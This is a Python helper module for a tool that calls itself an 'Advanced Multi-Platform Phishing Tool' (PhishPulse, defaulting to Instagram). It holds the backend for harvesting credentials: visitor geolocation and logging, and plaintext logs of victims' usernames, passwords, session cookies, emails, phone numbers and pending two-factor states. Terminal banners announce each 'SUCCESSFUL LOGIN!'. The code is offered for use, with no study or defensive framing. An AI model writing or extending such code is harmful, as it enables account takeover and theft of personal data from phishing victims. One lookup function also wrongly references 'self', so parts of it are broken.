#!/usr/bin/env python3
"""
PhishPulse - Helper Functions
Version: 1.0
Author: ATHEX BLACK HAT

Handles: IP Intelligence, Logging, Session Generation, Terminal Output
"""

import os
import json
import uuid
import hashlib
import socket
import requests
from datetime import datetime
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)


def get_ip_info(ip):
    """
    Get detailed information about an IP address
    
    Args:
        ip: IP address to lookup
        
    Returns:
        dict: IP information including country, city, ISP, VPN status
    """
    # Check for local/private IPs
    if is_private_ip(ip):
        return {
            'country': 'Local Network',
            'city': 'Local',
            'region': 'Local',
            'isp': 'Private Network',
            'is_vpn': False,
            'is_private': True
        }
    
    # Try multiple IP geolocation APIs
    apis = [
        {
            'url': f'http://ip-api.com/json/{ip}?fields=country,city,regionName,isp,proxy,hosting,query',
            'parser': '_parse_ipapi'
        },
        {
            'url': f'https://ipapi.co/{ip}/json/',
            'parser': '_parse_ipapico'
        },
        {
            'url': f'http://ipwho.is/{ip}',
            'parser': '_parse_ipwhois'
        }
    ]
    
    for api in apis:
        try:
            response = requests.get(api['url'], timeout=5, headers={
                'User-Agent': 'Mozilla/5.0 (compatible; PhishPulse/1.0)'
            })
            
            if response.status_code == 200:
                data = response.json()
                parser = getattr(self, api['parser']) if hasattr(self, api['parser']) else None
                
                if parser:
                    return parser(data)
                else:
                    return _default_parser(data)
        
        except:
            continue
    
    # If all APIs fail
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'region': 'Unknown',
        'isp': 'Unknown',
        'is_vpn': False
    }

def _parse_ipapi(data):
    """Parse ip-api.com response"""
    return {
        'country': data.get('country', 'Unknown'),
        'city': data.get('city', 'Unknown'),
        'region': data.get('regionName', 'Unknown'),
        'isp': data.get('isp', 'Unknown'),
        'is_vpn': data.get('proxy', False) or data.get('hosting', False),
        'ip': data.get('query', '')
    }

def _parse_ipapico(data):
    """Parse ipapi.co response"""
    return {
        'country': data.get('country_name', 'Unknown'),
        'city': data.get('city', 'Unknown'),
        'region': data.get('region', 'Unknown'),
        'isp': data.get('org', 'Unknown'),
        'is_vpn': False,
        'ip': data.get('ip', '')
    }

def _parse_ipwhois(data):
    """Parse ipwho.is response"""
    return {
        'country': data.get('country', 'Unknown'),
        'city': data.get('city', 'Unknown'),
        'region': data.get('region', 'Unknown'),
        'isp': data.get('connection', {}).get('isp', 'Unknown'),
        'is_vpn': data.get('security', {}).get('is_proxy', False) or data.get('security', {}).get('is_hosting', False),
        'ip': data.get('ip', '')
    }

def _default_parser(data):
    """Default parser for unknown API response"""
    return {
        'country': data.get('country', data.get('country_name', 'Unknown')),
        'city': data.get('city', 'Unknown'),
        'region': data.get('region', data.get('regionName', 'Unknown')),
        'isp': data.get('isp', data.get('org', 'Unknown')),
        'is_vpn': data.get('proxy', False) or data.get('hosting', False) or data.get('vpn', False),
        'ip': data.get('ip', data.get('query', ''))
    }

def is_private_ip(ip):
    """Check if IP is private/local"""
    if not ip:
        return True
    
    private_ranges = [
        ('10.0.0.0', '10.255.255.255'),
        ('172.16.0.0', '172.31.255.255'),
        ('192.168.0.0', '192.168.255.255'),
        ('127.0.0.0', '127.255.255.255'),
    ]
    
    try:
        ip_parts = [int(part) for part in ip.split('.')]
        ip_int = (ip_parts[0] << 24) + (ip_parts[1] << 16) + (ip_parts[2] << 8) + ip_parts[3]
        
        for start, end in private_ranges:
            start_parts = [int(p) for p in start.split('.')]
            end_parts = [int(p) for p in end.split('.')]
            start_int = (start_parts[0] << 24) + (start_parts[1] << 16) + (start_parts[2] << 8) + start_parts[3]
            end_int = (end_parts[0] << 24) + (end_parts[1] << 16) + (end_parts[2] << 8) + end_parts[3]
            
            if start_int <= ip_int <= end_int:
                return True
    except:
        pass
    
    return False


def generate_session_id():
    """
    Generate unique session ID for each visitor
    
    Returns:
        str: Unique session identifier
    """
    # Combine UUID with timestamp for uniqueness
    unique_id = str(uuid.uuid4())
    timestamp = str(int(datetime.now().timestamp()))
    combined = f"{unique_id}{timestamp}"
    
    # Create hash
    session_hash = hashlib.sha256(combined.encode()).hexdigest()[:32]
    
    return session_hash

def generate_short_id(length=8):
    """
    Generate short random ID
    
    Args:
        length: Length of ID
        
    Returns:
        str: Short random string
    """
    return uuid.uuid4().hex[:length]


def get_timestamp():
    """
    Get current timestamp in standard format
    
    Returns:
        str: Formatted timestamp
    """
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def get_iso_timestamp():
    """
    Get ISO format timestamp
    
    Returns:
        str: ISO timestamp
    """
    return datetime.now().isoformat()


def ensure_output_dir():
    """Ensure output directory exists"""
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    output_dir = os.path.join(base_dir, 'output')
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def ensure_data_dir():
    """Ensure data directory exists"""
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    data_dir = os.path.join(base_dir, 'data')
    os.makedirs(data_dir, exist_ok=True)
    return data_dir

def log_visitor(session_id, ip, user_agent, ip_info, platform):
    """
    Log visitor to file and JSON
    
    Args:
        session_id: Unique session ID
        ip: Visitor IP address
        user_agent: Browser user agent
        ip_info: IP intelligence data
        platform: Target platform
    """
    timestamp = get_timestamp()
    
    # Text log
    output_dir = ensure_output_dir()
    log_file = os.path.join(output_dir, 'visitors.log')
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"""
{'='*60}
Time: {timestamp}
Session: {session_id}
Platform: {platform}
IP: {ip}
Country: {ip_info.get('country', 'Unknown')}
City: {ip_info.get('city', 'Unknown')}
ISP: {ip_info.get('isp', 'Unknown')}
VPN: {'Yes' if ip_info.get('is_vpn') else 'No'}
User-Agent: {user_agent[:200]}
{'='*60}
""")
    
    # JSON data
    data_dir = ensure_data_dir()
    json_file = os.path.join(data_dir, 'visitors.json')
    
    visitor_data = {
        'session_id': session_id,
        'ip_address': ip,
        'user_agent': user_agent,
        'country': ip_info.get('country', 'Unknown'),
        'city': ip_info.get('city', 'Unknown'),
        'region': ip_info.get('region', 'Unknown'),
        'isp': ip_info.get('isp', 'Unknown'),
        'is_vpn': ip_info.get('is_vpn', False),
        'platform': platform,
        'timestamp': timestamp
    }
    
    try:
        if os.path.exists(json_file):
            with open(json_file, 'r') as f:
                visitors = json.load(f)
        else:
            visitors = []
        
        visitors.insert(0, visitor_data)
        
        # Keep only last 500
        visitors = visitors[:500]
        
        with open(json_file, 'w') as f:
            json.dump(visitors, f, indent=2)
    except:
        pass

def log_success(session_id, username, password, cookies, profile, ip_info):
    """
    Log successful login
    
    Args:
        session_id: Session ID
        username: Username
        password: Password
        cookies: Session cookies
        profile: Profile information
        ip_info: IP intelligence data
    """
    timestamp = get_timestamp()
    
    # Text log
    output_dir = ensure_output_dir()
    log_file = os.path.join(output_dir, 'success.log')
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"""
{'='*60}
Time: {timestamp}
Session: {session_id}
Username: {username}
Password: {password}
Email: {profile.get('email', 'N/A')}
Phone: {profile.get('phone', 'N/A')}
Full Name: {profile.get('full_name', 'N/A')}
Followers: {profile.get('followers', 0)}
Verified: {profile.get('is_verified', False)}
Cookies: {json.dumps(cookies) if cookies else 'N/A'}
IP: {ip_info.get('ip', 'N/A')}
Country: {ip_info.get('country', 'Unknown')}
City: {ip_info.get('city', 'Unknown')}
ISP: {ip_info.get('isp', 'Unknown')}
VPN: {'Yes' if ip_info.get('is_vpn') else 'No'}
{'='*60}
""")

def log_failed(session_id, username, password, ip_info):
    """
    Log failed login attempt
    
    Args:
        session_id: Session ID
        username: Username
        password: Password
        ip_info: IP intelligence data
    """
    timestamp = get_timestamp()
    
    output_dir = ensure_output_dir()
    log_file = os.path.join(output_dir, 'failed.log')
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"""
{'='*60}
Time: {timestamp}
Session: {session_id}
Username: {username}
Password: {password}
IP: {ip_info.get('ip', 'N/A')}
Country: {ip_info.get('country', 'Unknown')}
City: {ip_info.get('city', 'Unknown')}
ISP: {ip_info.get('isp', 'Unknown')}
{'='*60}
""")

def log_2fa_pending(session_id, username, password, twofa_method):
    """
    Log 2FA pending
    
    Args:
        session_id: Session ID
        username: Username
        password: Password
        twofa_method: 2FA method
    """
    timestamp = get_timestamp()
    
    output_dir = ensure_output_dir()
    log_file = os.path.join(output_dir, '2fa_pending.log')
    
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"""
{'='*60}
Time: {timestamp}
Session: {session_id}
Username: {username}
Password: {password}
2FA Method: {twofa_method}
Status: Waiting for code
{'='*60}
""")
def print_banner(tool_name="PhishPulse", version="1.0", author="ATHEX BLACK HAT", platform="instagram"):
    """Display tool banner in terminal"""
    banner = f"""
{Fore.CYAN}{Style.BRIGHT}

                                                                  
    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗ ██████╗ ██╗   ██╗██╗     ███████╗███████╗   "
    ██╔══██╗██║  ██║██║██╔════╝██║  ██║ ██╔══██╗██║   ██║██║     ██╔════╝██╔════╝    "
    ██████╔╝███████║██║███████╗███████║ ██████╔╝██║   ██║██║     ███████╗█████╗       "
    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║ ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝      "
    ██║     ██║  ██║██║███████║██║  ██║ ██║     ╚██████╔╝███████╗███████╗███████╗    "
    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝  
                                                                  
                   Advanced Multi-Platform Phishing Tool                  
                         v{version} by {author}                  
{Style.RESET_ALL}
"""
    print(banner)

def print_visitor(ip, user_agent, ip_info, platform):
    """Print visitor alert to terminal"""
    message = f"""
{Fore.YELLOW}{Style.BRIGHT}

   NEW VISITOR DETECTED!                                        

  Platform:   {Fore.CYAN}{platform.upper()}{' ' * (50 - len(platform))}{Fore.YELLOW}
  IP:         {Fore.WHITE}{ip}{' ' * (50 - len(str(ip)))}{Fore.YELLOW}
  Country:    {Fore.WHITE}{ip_info.get('country', 'Unknown')}{' ' * (50 - len(str(ip_info.get('country', 'Unknown'))))}{Fore.YELLOW}
  City:       {Fore.WHITE}{ip_info.get('city', 'Unknown')}{' ' * (50 - len(str(ip_info.get('city', 'Unknown'))))}{Fore.YELLOW}
  ISP:        {Fore.WHITE}{ip_info.get('isp', 'Unknown')[:40]}{' ' * (50 - min(len(str(ip_info.get('isp', 'Unknown'))), 40))}{Fore.YELLOW}
  VPN:        {Fore.RED if ip_info.get('is_vpn') else Fore.GREEN}{'⚠️  YES' if ip_info.get('is_vpn') else '✅ NO'}{' ' * (46)}{Fore.YELLOW}
  User-Agent: {Fore.WHITE}{str(user_agent)[:40]}...{' ' * (50 - min(len(str(user_agent)), 40) + 3)}{Fore.YELLOW}

{Style.RESET_ALL}
"""
    print(message)

def print_success(platform, username, password, profile, ip_info):
    """Print success alert to terminal"""
    message = f"""
{Fore.GREEN}{Style.BRIGHT}

   SUCCESSFUL LOGIN!                                            

  Platform:   {Fore.CYAN}{platform.upper()}{' ' * (50 - len(platform))}{Fore.GREEN}
  Username:   {Fore.WHITE}{username}{' ' * (50 - len(str(username)))}{Fore.GREEN}
  Password:   {Fore.YELLOW}{password}{' ' * (50 - len(str(password)))}{Fore.GREEN}
  Email:      {Fore.WHITE}{profile.get('email', 'N/A')}{' ' * (50 - len(str(profile.get('email', 'N/A'))))}{Fore.GREEN}
  Phone:      {Fore.WHITE}{profile.get('phone', 'N/A')}{' ' * (50 - len(str(profile.get('phone', 'N/A'))))}{Fore.GREEN}
  Name:       {Fore.WHITE}{profile.get('full_name', 'N/A')[:35]}{' ' * (50 - min(len(str(profile.get('full_name', 'N/A'))), 35))}{Fore.GREEN}
  Followers:  {Fore.WHITE}{profile.get('followers', 0)}{' ' * (50 - len(str(profile.get('followers', 0))))}{Fore.GREEN}
  Verified:   {Fore.WHITE}{'✅ Yes' if profile.get('is_verified') else '❌ No'}{' ' * (44)}{Fore.GREEN}
  Country:    {Fore.WHITE}{ip_info.get('country', 'Unknown')}{' ' * (50 - len(str(ip_info.get('country', 'Unknown'))))}{Fore.GREEN}
{Style.RESET_ALL}
"""
    print(message)

def print_failed(platform, username, password, ip_info):
    """Print failed alert to terminal"""
    message = f"""
{Fore.RED}{Style.BRIGHT}

   FAILED LOGIN ATTEMPT!                                        

  Platform:   {Fore.CYAN}{platform.upper()}{' ' * (50 - len(platform))}{Fore.RED}
  Username:   {Fore.WHITE}{username}{' ' * (50 - len(str(username)))}{Fore.RED}
  Password:   {Fore.YELLOW}{password}{' ' * (50 - len(str(password)))}{Fore.RED}
  Country:    {Fore.WHITE}{ip_info.get('country', 'Unknown')}{' ' * (50 - len(str(ip_info.get('country', 'Unknown'))))}{Fore.RED}
  IP:         {Fore.WHITE}{ip_info.get('ip', 'N/A')}{' ' * (50 - len(str(ip_info.get('ip', 'N/A'))))}{Fore.RED}
{Style.RESET_ALL}
"""
    print(message)

def print_2fa(platform, username, method):
    """Print 2FA alert to terminal"""
    message = f"""
{Fore.YELLOW}{Style.BRIGHT}

    2FA REQUIRED!                                               

  Platform:   {Fore.CYAN}{platform.upper()}{' ' * (50 - len(platform))}{Fore.YELLOW}
  Username:   {Fore.WHITE}{username}{' ' * (50 - len(str(username)))}{Fore.YELLOW}
  2FA Method: {Fore.WHITE}{method.upper()}{' ' * (50 - len(str(method)))}{Fore.YELLOW}
  Status:     {Fore.WHITE}Waiting for verification code...{' ' * (20)}{Fore.YELLOW}
{Style.RESET_ALL}
"""
    print(message)

def print_error(message):
    """Print error to terminal"""
    print(f"{Fore.RED}[✗] {message}{Style.RESET_ALL}")

def print_info(message):
    """Print info to terminal"""
    print(f"{Fore.CYAN}[*] {message}{Style.RESET_ALL}")

def print_success_msg(message):
    """Print success message to terminal"""
    print(f"{Fore.GREEN}[✓] {message}{Style.RESET_ALL}")

def print_warning(message):
    """Print warning to terminal"""
    print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")